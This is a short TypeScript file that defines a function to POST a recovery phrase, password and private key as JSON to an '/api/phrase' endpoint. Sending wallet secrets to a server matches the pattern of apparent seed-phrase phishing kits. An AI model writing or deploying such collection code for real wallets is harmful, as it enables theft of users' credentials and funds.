interface RequestData {
  phrase?: string;
  password?: string;
  privateKey?: string;
}

export async function sendPhraseData(data: RequestData) {
  try {
    const response = await fetch('/api/phrase', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data),
    });

    if (!response.ok) {
      throw new Error('Network response was not ok');
    }

    return await response.json();
  } catch (error) {
    console.error('Error sending phrase data:', error);
    throw error;
  }
}
